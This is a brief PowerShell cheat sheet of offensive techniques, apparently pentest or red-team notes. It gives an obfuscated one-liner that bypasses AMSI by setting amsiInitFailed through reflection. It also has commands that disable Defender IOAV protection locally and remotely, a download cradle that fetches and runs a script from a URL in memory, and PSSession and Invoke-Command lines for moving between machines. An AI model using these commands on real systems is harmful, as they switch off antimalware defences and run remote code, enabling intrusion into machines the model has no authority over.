##### AMSI Bypass Obscure
```sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )```

##### AMSI Bypass
Set-MpPreference -DisableIOAVProtection $true

##### AMSI Bypass remotely
Invoke-command - ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session <session>

##### PS Download into memory 
iex (iwr http://<url>/<file>.ps1 -UseBasicParsing)

##### Quickly confirm you have remote access to a machine:
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName <Computer Name>

##### Create new PSSession to Computername
$sesh = New-PSSession -ComputerName <ComputerName>

##### Connect to Session by Session
Enter-PSSession -session <session name ie $sesh>

##### Connect to Session by ComputerName
Enter-PSSession -ComputerName <computer>
